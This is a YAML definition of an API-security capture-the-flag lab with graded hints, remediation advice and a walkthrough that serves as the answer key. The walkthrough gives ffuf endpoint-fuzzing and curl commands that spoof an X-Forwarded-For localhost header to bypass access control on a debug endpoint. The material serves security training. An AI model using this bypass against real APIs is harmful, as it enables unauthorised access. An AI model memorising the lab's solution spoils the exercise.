slug: ewpt-api-endpoint-fuzzing
name: Service Corridor
category: api
category_name: API Security
skill: API Security
difficulty: medium
lab_kind: ewpt_115
est_minutes: 25
sort: 115
description: You have permission to investigate this isolated environment. Explore what is available and
  recover the flag.
hints:
- level: 1
  cost: 0
  body: Use ffuf with an API wordlist.
- level: 2
  cost: 5
  body: 'Use -mc all or -mc 200,403: a 403 still reveals an existing protected endpoint.'
- level: 3
  cost: 10
  body: 'Try X-Forwarded-For: 127.0.0.1.'
remediation: Do not trust forwarding headers; disable debug endpoints; authenticate APIs.
walkthrough: 'ffuf -u http://target.lab.local/api/FUZZ -w api-wordlist.txt -mc 200,403 reveals /api/debug
  with 403. curl -H "X-Forwarded-For: 127.0.0.1" http://target.lab.local/api/debug returns the flag.'
dynamic_flag: true
